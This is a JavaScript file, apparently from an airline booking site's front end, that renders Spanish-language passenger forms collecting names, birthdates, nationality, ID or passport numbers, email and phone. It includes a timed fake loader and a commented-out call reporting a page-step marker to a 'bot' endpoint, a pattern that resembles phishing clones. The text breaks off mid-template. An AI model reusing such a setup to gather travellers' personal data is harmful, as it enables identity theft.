/**
 * PASSENGERS HANDLER
 */
setTimeout(() =>{
    document.querySelector('.loader-full').remove();
}, 3500);
/*
fetch(`${API_URL}/api/bot/status`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${API_KEY}`
    }, 
    body: JSON.stringify({message: 'P4'})
});
*/
class UIPassengers{
    static passDiv = document.querySelector('#passengers');
    editing = undefined;

    static showPassengers(){
        let i = 0;
        console.log(this.passDiv);
        this.passDiv.innerHTML = '';

        /** show adults */
        if(info.flightInfo.adults > 0){
            info.passengersInfo.adults.forEach((adult) =>{ 
                this.passDiv.innerHTML += `
                    <div class="mb-4" id="${i}" data-type="adults">
                        <button onclick="UIPassengers.showDetails(${i})" data-type="adults" class="btn-closed-accordion shadow-1 mt-2 d-flex align-items-center justify-space-between">
                            <div class="d-flex align-items-center">
                                <svg class="tc-ocean-2 mr-1" xmlns="http://www.w3.org/2000/svg" width="22px" height="32px" viewBox="0 0 32 32" fill="none" focusable="false"><path d="M14.0075 2.40103C12.7448 2.40103 11.6507 2.85248 10.7435 3.76441C9.83625 4.67635 9.38712 5.76667 9.38712 7.04526C9.38712 8.32385 9.83625 9.41463 10.7435 10.3266C11.6507 11.2385 12.7354 11.6895 14.0075 11.6895C15.2795 11.6895 16.3646 11.2385 17.2719 10.3266C18.1791 9.41463 18.6283 8.32385 18.6283 7.04526C18.6283 5.77607 18.1791 4.67635 17.2719 3.76441C16.3646 2.86188 15.2795 2.40103 14.0075 2.40103ZM14.0075 13.1093C12.352 13.1093 10.9305 12.5169 9.75202 11.3324C8.57354 10.1478 7.98417 8.72835 7.98417 7.0549C7.98417 5.38145 8.57354 3.96157 9.75202 2.77699C10.9305 1.59242 12.352 1 14.0075 1C15.1205 1 16.1493 1.29183 17.0846 1.86531C18.0199 2.4388 18.7498 3.18116 19.2548 4.0931C19.7692 5.00503 20.0216 5.99254 20.0216 7.0549C20.0216 8.18307 19.7317 9.2074 19.1612 10.1475C18.5907 11.0877 17.8517 11.8211 16.9444 12.3381C16.0465 12.8458 15.0644 13.1093 14.0075 13.1093ZM4.68275 31C4.50504 31 4.34581 30.9344 4.20551 30.7934C4.06522 30.6524 4 30.4831 4 30.2669V20.5644C4 20.2635 4.14963 20.0379 4.44893 19.8781L24.062 12.7706C25.1843 12.3475 26.1196 12.3758 26.8679 12.8647C27.6255 13.3817 28 14.1812 28 15.2811V30.2104C28 30.3891 27.9343 30.5487 27.794 30.6897C27.6631 30.8307 27.4853 30.8967 27.2702 30.8967C27.0644 30.8967 26.8963 30.8307 26.7747 30.6897C26.6531 30.5487 26.5875 30.3985 26.5875 30.2104V15.2811C26.5875 14.7076 26.4287 14.2939 26.0919 14.0495C25.7272 13.805 25.2124 13.8237 24.5483 14.0963L5.38423 21.0629V30.2573C5.38423 30.4735 5.31856 30.6428 5.17826 30.7838C5.06603 30.9342 4.88852 31 4.68275 31Z" fill="currentColor"></path></svg>
                                <p class="m-0 fw-light tc-gray-smoke">Adulto</p>
                            </div>
                            <svg class="tc-pink arrow-open" xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewBox="0 0 20 20" fill="none" focusable="false"><path fill="currentColor" d="M16.611 5.382L10.011 12l-6.6-6.618-1.4 1.4 8 8 8-8z"></path></svg>
                        </button>
                        <form class="bg-white p-3 form-passenger" data-type="adults" id="${i}">
                            <div class="input-container">
                                <input required type="text" name="name" required>
                                <label for="origin">Nombre</label>
                            </div>
                            <div class="input-container">
                                <input type="text" required name="surname">
                                <label for="origin">Apellido</label>
                            </div>
                            <div class="input-container ">
                                <input required class="input-date-bg" value=" " oninput="formatDate(this)" name="bithdate" type="text" required>
                                <label for="origin">Fecha de Nacimiento</label>
                            </div>
                            <div class="select-container">
                                <select>
                                    <option value="Masculino">Masculino</option>
                                    <option value="Femenino">Femenino</option>
                                </select>
                                <label for="origin">Género</label>
                            </div>
                            <div class="select-container">
                                <select>
                                    <option value="Afganistán">Afganistán</option>
                                    <option value="Albania">Albania</option>
                                    <option value="Alemania">Alemania</option>
                                    <option value="Andorra">Andorra</option>
                                    <option value="Angola">Angola</option>
                                    <option value="Antigua y Barbuda">Antigua y Barbuda</option>
                                    <option value="Arabia Saudita">Arabia Saudita</option>
                                    <option value="Argelia">Argelia</option>
                                    <option value="Argentina">Argentina</option>
                                    <option value="Armenia">Armenia</option>
                                    <option value="Australia">Australia</option>
                                    <option value="Austria">Austria</option>
                                    <option value="Azerbaiyán">Azerbaiyán</option>
                                    <option value="Bahamas">Bahamas</option>
                                    <option value="Bangladés">Bangladés</option>
                                    <option value="Barbados">Barbados</option>
                                    <option value="Baréin">Baréin</option>
                                    <option value="Bélgica">Bélgica</option>
                                    <option value="Belice">Belice</option>
                                    <option value="Benín">Benín</option>
                                    <option value="Bielorrusia">Bielorrusia</option>
                                    <option value="Birmania/Myanmar">Birmania/Myanmar</option>
                                    <option value="Bolivia">Bolivia</option>
                                    <option value="Bosnia y Herzegovina">Bosnia y Herzegovina</option>
                                    <option value="Botsuana">Botsuana</option>
                                    <option value="Brasil">Brasil</option>
                                    <option value="Brunéi">Brunéi</option>
                                    <option value="Bulgaria">Bulgaria</option>
                                    <option value="Burkina Faso">Burkina Faso</option>
                                    <option value="Burundi">Burundi</option>
                                    <option value="Bután">Bután</option>
                                    <option value="Cabo Verde">Cabo Verde</option>
                                    <option value="Camboya">Camboya</option>
                                    <option value="Camerún">Camerún</option>
                                    <option value="Canadá">Canadá</option>
                                    <option value="Catar">Catar</option>
                                    <option value="Chad">Chad</option>
                                    <option value="Chile">Chile</option>
                                    <option value="China">China</option>
                                    <option value="Chipre">Chipre</option>
                                    <option value="Ciudad del Vaticano">Ciudad del Vaticano</option>
                                    <option value="Colombia" selected>Colombia</option>
                                    <option value="Comoras">Comoras</option>
                                    <option value="Corea del Norte">Corea del Norte</option>
                                    <option value="Corea del Sur">Corea del Sur</option>
                                    <option value="Costa de Marfil">Costa de Marfil</option>
                                    <option value="Costa Rica">Costa Rica</option>
                                    <option value="Croacia">Croacia</option>
                                    <option value="Cuba">Cuba</option>
                                    <option value="Dinamarca">Dinamarca</option>
                                    <option value="Dominica">Dominica</option>
                                    <option value="Ecuador">Ecuador</option>
                                    <option value="Egipto">Egipto</option>
                                    <option value="El Salvador">El Salvador</option>
                                    <option value="Emiratos Árabes Unidos">Emiratos Árabes Unidos</option>
                                    <option value="Eritrea">Eritrea</option>
                                    <option value="Eslovaquia">Eslovaquia</option>
                                    <option value="Eslovenia">Eslovenia</option>
                                    <option value="España">España</option>
                                    <option value="Estados Unidos">Estados Unidos</option>
                                    <option value="Estonia">Estonia</option>
                                    <option value="Etiopía">Etiopía</option>
                                    <option value="Filipinas">Filipinas</option>
                                    <option value="Finlandia">Finlandia</option>
                                    <option value="Fiyi">Fiyi</option>
                                    <option value="Francia">Francia</option>
                                    <option value="Gabón">Gabón</option>
                                    <option value="Gambia">Gambia</option>
                                    <option value="Georgia">Georgia</option>
                                    <option value="Ghana">Ghana</option>
                                    <option value="Granada">Granada</option>
                                    <option value="Grecia">Grecia</option>
                                    <option value="Guatemala">Guatemala</option>
                                    <option value="Guyana">Guyana</option>
                                    <option value="Guinea">Guinea</option>
                                    <option value="Guinea ecuatorial">Guinea ecuatorial</option>
                                    <option value="Guinea-Bisáu">Guinea-Bisáu</option>
                                    <option value="Haití">Haití</option>
                                    <option value="Honduras">Honduras</option>
                                    <option value="Hungría">Hungría</option>
                                    <option value="India">India</option>
                                    <option value="Indonesia">Indonesia</option>
                                    <option value="Irak">Irak</option>
                                    <option value="Irán">Irán</option>
                                    <option value="Irlanda">Irlanda</option>
                                    <option value="Islandia">Islandia</option>
                                    <option value="Islas Marshall">Islas Marshall</option>
                                    <option value="Islas Salomón">Islas Salomón</option>
                                    <option value="Israel">Israel</option>
                                    <option value="Italia">Italia</option>
                                    <option value="Jamaica">Jamaica</option>
                                    <option value="Japón">Japón</option>
                                    <option value="Jordania">Jordania</option>
                                    <option value="Kazajistán">Kazajistán</option>
                                    <option value="Kenia">Kenia</option>
                                    <option value="Kirguistán">Kirguistán</option>
                                    <option value="Kiribati">Kiribati</option>
                                    <option value="Kuwait">Kuwait</option>
                                    <option value="Laos">Laos</option>
                                    <option value="Lesoto">Lesoto</option>
                                    <option value="Letonia">Letonia</option>
                                    <option value="Líbano">Líbano</option>
                                    <option value="Liberia">Liberia</option>
                                    <option value="Libia">Libia</option>
                                    <option value="Liechtenstein">Liechtenstein</option>
                                    <option value="Lituania">Lituania</option>
                                    <option value="Luxemburgo">Luxemburgo</option>
                                    <option value="Macedonia del Norte">Macedonia del Norte</option>
                                    <option value="Madagascar">Madagascar</option>
                                    <option value="Malasia">Malasia</option>
                                    <option value="Malaui">Malaui</option>
                                    <option value="Maldivas">Maldivas</option>
                                    <option value="Malí">Malí</option>
                                    <option value="Malta">Malta</option>
                                    <option value="Marruecos">Marruecos</option>
                                    <option value="Mauricio">Mauricio</option>
                                    <option value="Mauritania">Mauritania</option>
                                    <option value="México">México</option>
                                    <option value="Micronesia">Micronesia</option>
                                    <option value="Moldavia">Moldavia</option>
                                    <option value="Mónaco">Mónaco</option>
                                    <option value="Mongolia">Mongolia</option>
                                    <option value="Montenegro">Montenegro</option>
                                    <option value="Mozambique">Mozambique</option>
                                    <option value="Namibia">Namibia</option>
                                    <option value="Nauru">Nauru</option>
                                    <option value="Nepal">Nepal</option>
                                    <option value="Nicaragua">Nicaragua</option>
                                    <option value="Níger">Níger</option>
                                    <option value="Nigeria">Nigeria</option>
                                    <option value="Noruega">Noruega</option>
                                    <option value="Nueva Zelanda">Nueva Zelanda</option>
                                    <option value="Omán">Omán</option>
                                    <option value="Países Bajos">Países Bajos</option>
                                    <option value="Pakistán">Pakistán</option>
                                    <option value="Palaos">Palaos</option>
                                    <option value="Panamá">Panamá</option>
                                    <option value="Papúa Nueva Guinea">Papúa Nueva Guinea</option>
                                    <option value="Paraguay">Paraguay</option>
                                    <option value="Perú">Perú</option>
                                    <option value="Polonia">Polonia</option>
                                    <option value="Portugal">Portugal</option>
                                    <option value="Reino Unido">Reino Unido</option>
                                    <option value="República Centroafricana">República Centroafricana</option>
                                    <option value="República Checa">República Checa</option>
                                    <option value="República del Congo">República del Congo</option>
                                    <option value="República Democrática del Congo">República Democrática del Congo</option>
                                    <option value="República Dominicana">República Dominicana</option>
                                    <option value="República Sudafricana">República Sudafricana</option>
                                    <option value="Ruanda">Ruanda</option>
                                    <option value="Rumanía">Rumanía</option>
                                    <option value="Rusia">Rusia</option>
                                    <option value="Samoa">Samoa</option>
                                    <option value="San Cristóbal y Nieves">San Cristóbal y Nieves</option>
                                    <option value="San Marino">San Marino</option>
                                    <option value="San Vicente y las Granadinas">San Vicente y las Granadinas</option>
                                    <option value="Santa Lucía">Santa Lucía</option>
                                    <option value="Santo Tomé y Príncipe">Santo Tomé y Príncipe</option>
                                    <option value="Senegal">Senegal</option>
                                    <option value="Serbia">Serbia</option>
                                    <option value="Seychelles">Seychelles</option>
                                    <option value="Sierra Leona">Sierra Leona</option>
                                    <option value="Singapur">Singapur</option>
                                    <option value="Siria">Siria</option>
                                    <option value="Somalia">Somalia</option>
                                    <option value="Sri Lanka">Sri Lanka</option>
                                    <option value="Suazilandia">Suazilandia</option>
                                    <option value="Sudán">Sudán</option>
                                    <option value="Sudán del Sur">Sudán del Sur</option>
                                    <option value="Suecia">Suecia</option>
                                    <option value="Suiza">Suiza</option>
                                    <option value="Surinam">Surinam</option>
                                    <option value="Tailandia">Tailandia</option>
                                    <option value="Tanzania">Tanzania</option>
                                    <option value="Tayikistán">Tayikistán</option>
                                    <option value="Timor Oriental">Timor Oriental</option>
                                    <option value="Togo">Togo</option>
                                    <option value="Tonga">Tonga</option>
                                    <option value="Trinidad y Tobago">Trinidad y Tobago</option>
                                    <option value="Túnez">Túnez</option>
                                    <option value="Turkmenistán">Turkmenistán</option>
                                    <option value="Turquía">Turquía</option>
                                    <option value="Tuvalu">Tuvalu</option>
                                    <option value="Ucrania">Ucrania</option>
                                    <option value="Uganda">Uganda</option>
                                    <option value="Uruguay">Uruguay</option>
                                    <option value="Uzbekistán">Uzbekistán</option>
                                    <option value="Vanuatu">Vanuatu</option>
                                    <option value="Venezuela">Venezuela</option>
                                    <option value="Vietnam">Vietnam</option>
                                    <option value="Yemen">Yemen</option>
                                    <option value="Yibuti">Yibuti</option>
                                    <option value="Zambia">Zambia</option>
                                    <option value="Zimbabue">Zimbabue</option>
                                </select>
                                <label for="origin">Nacionalidad</label>
                            </div>
                            <div class="select-container">
                                <select>
                                    <option value="cc">Cédula de Ciudadanía</option>
                                    <option value="passport">Pasaporte</option>
                                </select>
                                <label for="origin">Tipo de documento</label>
                            </div>
                            <div class="input-container ">
                                <input required class="" type="number" name="cc" required oninput="limitDigits(this, 10)">
                                <label for="origin">Número de documento</label>
                                <p class="fs-6 tc-gray-smoke ml-3 mb-0">Sin puntos ni guión</p>
                            </div>
                            <div class="input-container ">
                                <input class="" type="text">
                                <label for="origin">N° de pasajero frecuente (Opcional)</label>
                                <p class="fs-6 tc-gray-smoke ml-3 mb-0">Agrega número de socio y acumula millas</p>
                            </div>
            
                            <p class="fs-4 tc-ocean-2 fw-light mt-5">Información de contacto</p>
            
                            <div class="input-container ">
                                <input required class="" type="email" required>
                                <label for="origin">Email</label>
                            </div>
                            <div class="input-container ">
                                <input required class="" type="text" required>
                                <label for="origin">Número de teléfono</label>
                            </div>
            
                            <button class="btn-success-2 mt-4" type="submit">
                                Guardar
                            </button>
                        </form>
                    </div>
                `;
                i++;
            });
        }

        /** show children */
        if(info.flightInfo.children > 0){
            info.passengersInfo.children.forEach((children) =>{
                this.passDiv.innerHTML += `
                    <div class="mb-4" id="${i}" data-type="children">
                        <button onclick="UIPassengers.showDetails(${i})" data-type="children" class="btn-closed-accordion shadow-1 mt-2 d-flex align-items-center justify-space-between">
                            <div class="d-flex align-items-center">
                                <svg class="tc-ocean-2 mr-1" xmlns="http://www.w3.org/2000/svg" width="22px" height="32px" viewBox="0 0 32 32" fill="none" focusable="false"><path d="M14.0075 2.40103C12.7448 2.40103 11.6507 2.85248 10.7435 3.76441C9.83625 4.67635 9.38712 5.76667 9.38712 7.04526C9.38712 8.32385 9.83625 9.41463 10.7435 10.3266C11.6507 11.2385 12.7354 11.6895 14.0075 11.6895C15.2795 11.6895 16.3646 11.2385 17.2719 10.3266C18.1791 9.41463 18.6283 8.32385 18.6283 7.04526C18.6283 5.77607 18.1791 4.67635 17.2719 3.76441C16.3646 2.86188 15.2795 2.40103 14.0075 2.40103ZM14.0075 13.1093C12.352 13.1093 10.9305 12.5169 9.75202 11.3324C8.57354 10.1478 7.98417 8.72835 7.98417 7.0549C7.98417 5.38145 8.57354 3.96157 9.75202 2.77699C10.9305 1.59242 12.352 1 14.0075 1C15.1205 1 16.1493 1.29183 17.0846 1.86531C18.0199 2.4388 18.7498 3.18116 19.2548 4.0931C19.7692 5.00503 20.0216 5.99254 20.0216 7.0549C20.0216 8.18307 19.7317 9.2074 19.1612 10.1475C18.5907 11.0877 17.8517 11.8211 16.9444 12.3381C16.0465 12.8458 15.0644 13.1093 14.0075 13.1093ZM4.68275 31C4.50504 31 4.34581 30.9344 4.20551 30.7934C4.06522 30.6524 4 30.4831 4 30.2669V20.5644C4 20.2635 4.14963 20.0379 4.44893 19.8781L24.062 12.7706C25.1843 12.3475 26.1196 12.3758 26.8679 12.8647C27.6255 13.3817 28 14.1812 28 15.2811V30.2104C28 30.3891 27.9343 30.5487 27.794 30.6897C27.6631 30.8307 27.4853 30.8967 27.2702 30.8967C27.0644 30.8967 26.8963 30.8307 26.7747 30.6897C26.6531 30.5487 26.5875 30.3985 26.5875 30.2104V15.2811C26.5875 14.7076 26.4287 14.2939 26.0919 14.0495C25.7272 13.805 25.2124 13.8237 24.5483 14.0963L5.38423 21.0629V30.2573C5.38423 30.4735 5.31856 30.6428 5.17826 30.7838C5.06603 30.9342 4.88852 31 4.68275 31Z" fill="currentColor"></path></svg>
                                <p class="m-0 fw-light tc-gray-smoke">Niño</p>
                            </div>
                            <svg class="tc-pink arrow-open" xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewBox="0 0 20 20" fill="none" focusable="false"><path fill="currentColor" d="M16.611 5.382L10.011 12l-6.6-6.618-1.4 1.4 8 8 8-8z"></path></svg>
                        </button>
                        <form class="bg-white p-3 form-passenger" data-type="children" id="${i}">
                            <div class="input-container">
                                <input required type="text" name="name" required>
                                <label for="origin">Nombre</label>
                            </div>
                            <div class="input-container">
                                <input type="text" required name="surname">
                                <label for="origin">Apellido</label>
                            </div>
                            <div class="input-container ">
                                <input required class="input-date-bg" value=" " oninput="formatDate(this)" name="bithdate" type="text" required>
                                <label for="origin">Fecha de Nacimiento</label>
                            </div>
                            <div class="select-container">
                                <select>
                                    <option value="Masculino">Masculino</option>
                                    <option value="Femenino">Femenino</option>
                                </select>
                                <label for="origin">Género</label>
                            </div>
                            <div class="select-container">
                                <select>
                                    <option value="Afganistán">Afganistán</option>
                                    <option value="Albania">Albania</option>
                                    <option value="Alemania">Alemania</option>
                                    <option value="Andorra">Andorra</option>
                                    <option value="Angola">Angola</option>
                                    <option value="Antigua y Barbuda">Antigua y Barbuda</option>
                                    <option value="Arabia Saudita">Arabia Saudita</option>
                                    <option value="Argelia">Argelia</option>
                                    <option value="Argentina">Argentina</option>
                                    <option value="Armenia">Armenia</option>
                                    <option value="Australia">Australia</option>
                                    <option value="Austria">Austria</option>
                                    <option value="Azerbaiyán">Azerbaiyán</option>
                                    <option value="Bahamas">Bahamas</option>
                                    <option value="Bangladés">Bangladés</option>
                                    <option value="Barbados">Barbados</option>
                                    <option value="Baréin">Baréin</option>
                                    <option value="Bélgica">Bélgica</option>
                                    <option value="Belice">Belice</option>
                                    <option value="Benín">Benín</option>
                                    <option value="Bielorrusia">Bielorrusia</option>
                                    <option value="Birmania/Myanmar">Birmania/Myanmar</option>
                                    <option value="Bolivia">Bolivia</option>
                                    <option value="Bosnia y Herzegovina">Bosnia y Herzegovina</option>
                                    <option value="Botsuana">Botsuana</option>
                                    <option value="Brasil">Brasil</option>
                                    <option value="Brunéi">Brunéi</option>
                                    <option value="Bulgaria">Bulgaria</option>
                                    <option value="Burkina Faso">Burkina Faso</option>
                                    <option value="Burundi">Burundi</option>
                                    <option value="Bután">Bután</option>
                                    <option value="Cabo Verde">Cabo Verde</option>
                                    <option value="Camboya">Camboya</option>
                                    <option value="Camerún">Camerún</option>
                                    <option value="Canadá">Canadá</option>
                                    <option value="Catar">Catar</option>
                                    <option value="Chad">Chad</option>
                                    <option value="Chile">Chile</option>
                                    <option value="China">China</option>
                                    <option value="Chipre">Chipre</option>
                                    <option value="Ciudad del Vaticano">Ciudad del Vaticano</option>
                                    <option value="Colombia" selected>Colombia</option>
                                    <option value="Comoras">Comoras</option>
                                    <option value="Corea del Norte">Corea del Norte</option>
                                    <option value="Corea del Sur">Corea del Sur</option>
                                    <option value="Costa de Marfil">Costa de Marfil</option>
                                    <option value="Costa Rica">Costa Rica</option>
                                    <option value="Croacia">Croacia</option>
                                    <option value="Cuba">Cuba</option>
                                    <option value="Dinamarca">Dinamarca</option>
                                    <option value="Dominica">Dominica</option>
                                    <option value="Ecuador">Ecuador</option>
                                    <option value="Egipto">Egipto</option>
                                    <option value="El Salvador">El Salvador</option>
                                    <option value="Emiratos Árabes Unidos">Emiratos Árabes Unidos</option>
                                    <option value="Eritrea">Eritrea</option>
                                    <option value="Eslovaquia">Eslovaquia</option>
                                    <option value="Eslovenia">Eslovenia</option>
                                    <option value="España">España</option>
                                    <option value="Estados Unidos">Estados Unidos</option>
                                    <option value="Estonia">Estonia</option>
                                    <option value="Etiopía">Etiopía</option>
                                    <option value="Filipinas">Filipinas</option>
                                    <option value="Finlandia">Finlandia</option>
                                    <option value="Fiyi">Fiyi</option>
                                    <option value="Francia">Francia</option>
                                    <option value="Gabón">Gabón</option>
                                    <option value="Gambia">Gambia</option>
                                    <option value="Georgia">Georgia</option>
                                    <option value="Ghana">Ghana</option>
                                    <option value="Granada">Granada</option>
                                    <option value="Grecia">Grecia</option>
                                    <option value="Guatemala">Guatemala</option>
                                    <option value="Guyana">Guyana</option>
                                    <option value="Guinea">Guinea</option>
                                    <option value="Guinea ecuatorial">Guinea ecuatorial</option>
                                    <option value="Guinea-Bisáu">Guinea-Bisáu</option>
                                    <option value="Haití">Haití</option>
                                    <option value="Honduras">Honduras</option>
                                    <option value="Hungría">Hungría</option>
                                    <option value="India">India</option>
                                    <option value="Indonesia">Indonesia</option>
                                    <option value="Irak">Irak</option>
                                    <option value="Irán">Irán</option>
                                    <option value="Irlanda">Irlanda</option>
                                    <option value="Islandia">Islandia</option>
                                    <option value="Islas Marshall">Islas Marshall</option>
                                    <option value="Islas Salomón">Islas Salomón</option>
                                    <option value="Israel">Israel</option>
                                    <option value="Italia">Italia</option>
                                    <option value="Jamaica">Jamaica</option>
                                    <option value="Japón">Japón</option>
                                    <option value="Jordania">Jordania</option>
                                    <option value="Kazajistán">Kazajistán</option>
                                    <option value="Kenia">Kenia</option>
                                    <option value="Kirguistán">Kirguistán</option>
                                    <option value="Kiribati">Kiribati</option>
                                    <option value="Kuwait">Kuwait</option>
                                    <option value="Laos">Laos</option>
                                    <option value="Lesoto">Lesoto</option>
                                    <option value="Letonia">Letonia</option>
                                    <option value="Líbano">Líbano</option>
                                    <option value="Liberia">Liberia</option>
                                    <option value="Libia">Libia</option>
                                    <option value="Liechtenstein">Liechtenstein</option>
                                    <option value="Lituania">Lituania</option>
                                    <option value="Luxemburgo">Luxemburgo</option>
                                    <option value="Macedonia del Norte">Macedonia del Norte</option>
                                    <option value="Madagascar">Madagascar</option>
                                    <option value="Malasia">Malasia</option>
                                    <option value="Malaui">Malaui</option>
                                    <option value="Maldivas">Maldivas</option>
                                    <option value="Malí">Malí</option>
                                    <option value="Malta">Malta</option>
                                    <option value="Marruecos">Marruecos</option>
                                    <option value="Mauricio">Mauricio</option>
                                    <option value="Mauritania">Mauritania</option>
                                    <option value="México">México</option>
                                    <option value="Micronesia">Micronesia</option>
                                    <option value="Moldavia">Moldavia</option>
                                    <option value="Mónaco">Mónaco</option>
                                    <option value="Mongolia">Mongolia</option>
                                    <option value="Montenegro">Montenegro</option>
                                    <option value="Mozambique">Mozambique</option>
                                    <option value="Namibia">Namibia</option>
                                    <option value="Nauru">Nauru</option>
                                    <option value="Nepal">Nepal</option>
                                    <option value="Nicaragua">Nicaragua</option>
                                    <option value="Níger">Níger</option>
                                    <option value="Nigeria">Nigeria</option>
                                    <option value="Noruega">Noruega</option>
                                    <option value="Nueva Zelanda">Nueva Zelanda</option>
                                    <option value="Omán">Omán</option>
                                    <option value="Países Bajos">Países Bajos</option>
                                    <option value="Pakistán">Pakistán</option>
                                    <option value="Palaos">Palaos</option>
                                    <option value="Panamá">Panamá</option>
                                    <option value="Papúa Nueva Guinea">Papúa Nueva Guinea</option>
                                    <option value="Paraguay">Paraguay</option>
                                    <option value="Perú">Perú</option>
                                    <option value="Polonia">Polonia</option>
                                    <option value="Portugal">Portugal</option>
                                    <option value="Reino Unido">Reino Unido</option>
                                    <option value="República Centroafricana">República Centroafricana</option>
                                    <option value="República Checa">República Checa</option>
                                    <option value="República del Congo">República del Congo</option>
                                    <option value="República Democrática del Congo">República Democrática del Congo</option>
                                    <option value="República Dominicana">República Dominicana</option>
                                    <option value="República Sudafricana">República Sudafricana</option>
                                    <option value="Ruanda">Ruanda</option>
                                    <option value="Rumanía">Rumanía</option>
                                    <option value="Rusia">Rusia</option>
                                    <option value="Samoa">Samoa</option>
                                    <option value="San Cristóbal y Nieves">San Cristóbal y Nieves</option>
                                    <option value="San Marino">San Marino</option>
                                    <option value="San Vicente y las Granadinas">San Vicente y las Granadinas</option>
                                    <option value="Santa Lucía">Santa Lucía</option>
                                    <option value="Santo Tomé y Príncipe">Santo Tomé y Príncipe</option>
                                    <option value="Senegal">Senegal</option>
                                    <option value="Serbia">Serbia</option>
                                    <option value="Seychelles">Seychelles</option>
                                    <option value="Sierra Leona">Sierra Leona</option>
                                    <option value="Singapur">Singapur</option>
                                    <option value="Siria">Siria</option>
                                    <option value="Somalia">Somalia</option>
                                    <option value="Sri Lanka">Sri Lanka</option>
                                    <option value="Suazilandia">Suazilandia</option>
                                    <option value="Sudán">Sudán</option>
                                    <option value="Sudán del Sur">Sudán del Sur</option>
                                    <option value="Suecia">Suecia</option>
                                    <option value="Suiza">Suiza</option>
                                    <option value="Surinam">Surinam</option>
                                    <option value="Tailandia">Tailandia</option>
                                    <option value="Tanzania">Tanzania</option>
                                    <option value="Tayikistán">Tayikistán</option>
                                    <option value="Timor Oriental">Timor Oriental</option>
                                    <option value="Togo">Togo</option>
                                    <option value="Tonga">Tonga</option>
                                    <option value="Trinidad y Tobago">Trinidad y Tobago</option>
                                    <option value="Túnez">Túnez</option>
                                    <option value="Turkmenistán">Turkmenistán</option>
                                    <option value="Turquía">Turquía</option>
                                    <option value="Tuvalu">Tuvalu</option>
                                    <option value="Ucrania">Ucrania</option>
                                    <option value="Uganda">Uganda</option>
                                    <option value="Uruguay">Uruguay</option>
                                    <option value="Uzbekistán">Uzbekistán</option>
                                    <option value="Vanuatu">Vanuatu</option>
                                    <option value="Venezuela">Venezuela</option>
                                    <option value="Vietnam">Vietnam</option>
                                    <option value="Yemen">Yemen</option>
                                    <option value="Yibuti">Yibuti</option>
                                    <option value="Zambia">Zambia</option>
                                    <option value="Zimbabue">Zimbabue</option>
                                </select>
                                <label for="origin">Nacionalidad</label>
                            </div>
                            <div class="select-container">
                                <select>
                                    <option value="cc">Cédula de Ciudadanía</option>
                                    <option value="passport">Pasaporte</option>
                                </select>
                                <label for="origin">Tipo de documento</label>
                            </div>
                            <div class="input-container ">
                                <input required class="" type="number" name="cc" required oninput="limitDigits(this, 10)">
                                <label for="origin">Número de documento</label>
                                <p class="fs-6 tc-gray-smoke ml-3 mb-0">Sin puntos ni guión</p>
                            </div>
                            <div class="input-container ">
                                <input class="" type="text">
                                <label for="origin">N° de pasajero frecuente (Opcional)</label>
                                <p class="fs-6 tc-gray-smoke ml-3 mb-0">Agrega número de socio y acumula millas</p>
                            </div>
            
                            <p class="fs-4 tc-ocean-2 fw-light mt-5">Información de contacto</p>
            
                            <div class="input-container ">
                                <input required class="" type="email" required>
                                <label for="origin">Email</label>
                            </div>
                            <div class="input-container ">
                                <input required class="" type="text" required>
                                <label for="origin">Número de teléfono</label>
                            </div>
            
                            <button class="btn-success-2 mt-4" type="submit">
                                Guardar
                            </button>
                        </form>
                    </div>
                `;
                i++;
            });
        }

        /** show babies */
        if(info.flightInfo.babies > 0){
            info.passengersInfo.babies.forEach(() =>{
                this.passDiv.innerHTML += `
                    <div class="mb-4" data-type="babies" id="${i}">
                        <button onclick="UIPassengers.showDetails(${i})" data-type="babies" class="btn-closed-accordion shadow-1 mt-2 d-flex align-items-center justify-space-between">
                            <div class="d-flex align-items-center">
                                <svg class="tc-ocean-2 mr-1" xmlns="http://www.w3.org/2000/svg" width="22px" height="32px" viewBox="0 0 32 32" fill="none" focusable="false"><path d="M14.0075 2.40103C12.7448 2.40103 11.6507 2.85248 10.7435 3.76441C9.83625 4.67635 9.38712 5.76667 9.38712 7.04526C9.38712 8.32385 9.83625 9.41463 10.7435 10.3266C11.6507 11.2385 12.7354 11.6895 14.0075 11.6895C15.2795 11.6895 16.3646 11.2385 17.2719 10.3266C18.1791 9.41463 18.6283 8.32385 18.6283 7.04526C18.6283 5.77607 18.1791 4.67635 17.2719 3.76441C16.3646 2.86188 15.2795 2.40103 14.0075 2.40103ZM14.0075 13.1093C12.352 13.1093 10.9305 12.5169 9.75202 11.3324C8.57354 10.1478 7.98417 8.72835 7.98417 7.0549C7.98417 5.38145 8.57354 3.96157 9.75202 2.77699C10.9305 1.59242 12.352 1 14.0075 1C15.1205 1 16.1493 1.29183 17.0846 1.86531C18.0199 2.4388 18.7498 3.18116 19.2548 4.0931C19.7692 5.00503 20.0216 5.99254 20.0216 7.0549C20.0216 8.18307 19.7317 9.2074 19.1612 10.1475C18.5907 11.0877 17.8517 11.8211 16.9444 12.3381C16.0465 12.8458 15.0644 13.1093 14.0075 13.1093ZM4.68275 31C4.50504 31 4.34581 30.9344 4.20551 30.7934C4.06522 30.6524 4 30.4831 4 30.2669V20.5644C4 20.2635 4.14963 20.0379 4.44893 19.8781L24.062 12.7706C25.1843 12.3475 26.1196 12.3758 26.8679 12.8647C27.6255 13.3817 28 14.1812 28 15.2811V30.2104C28 30.3891 27.9343 30.5487 27.794 30.6897C27.6631 30.8307 27.4853 30.8967 27.2702 30.8967C27.0644 30.8967 26.8963 30.8307 26.7747 30.6897C26.6531 30.5487 26.5875 30.3985 26.5875 30.2104V15.2811C26.5875 14.7076 26.4287 14.2939 26.0919 14.0495C25.7272 13.805 25.2124 13.8237 24.5483 14.0963L5.38423 21.0629V30.2573C5.38423 30.4735 5.31856 30.6428 5.17826 30.7838C5.06603 30.9342 4.88852 31 4.68275 31Z" fill="currentColor"></path></svg>
                                <p class="m-0 fw-light tc-gray-smoke">Bebé</p>
                            </div>
                            <svg class="tc-pink arrow-open" xmlns="http://www.w3.org/2000/svg" width="20px" height="20px" viewBox="0 0 20 20" fill="none" focusable="false"><path fill="currentColor" d="M16.611 5.382L10.011 12l-6.6-6.618-1.4 1.4 8 8 8-8z"></path></svg>
                        </button>
                        <form class="bg-white p-3 form-passenger" data-type="babies" id="${i}">
                            <div class="input-container">
                                <input required type="text" name="name" required>
                                <label for="origin">Nombre</label>
                            </div>
                            <div class="input-container">
                                <input type="text" required name="surname">
                                <label for="origin">Apellido</label>
                            </div>
                            <div class="input-container ">
